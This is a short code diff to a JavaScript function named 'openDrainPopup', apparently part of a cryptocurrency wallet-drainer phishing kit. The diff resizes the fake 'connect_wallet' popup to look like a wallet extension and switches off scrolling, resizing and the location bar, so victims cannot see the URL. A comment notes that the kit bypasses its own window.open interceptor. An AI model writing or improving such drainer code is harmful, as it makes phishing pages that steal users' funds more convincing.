@@ -76,12 +76,12 @@ function openDrainPopup(walletName) {
   if (isMobile) {
     window.location.href = url;
   } else {
-    const pw = 440, ph = 700;
+    const pw = 360, ph = 540;
     const left = Math.round((screen.width - pw) / 2);
     const top = Math.round((screen.height - ph) / 2);
     // Use _origOpen to bypass our own interceptor
     _origOpen(url, 'connect_wallet',
-      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
+      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
     );
   }
 
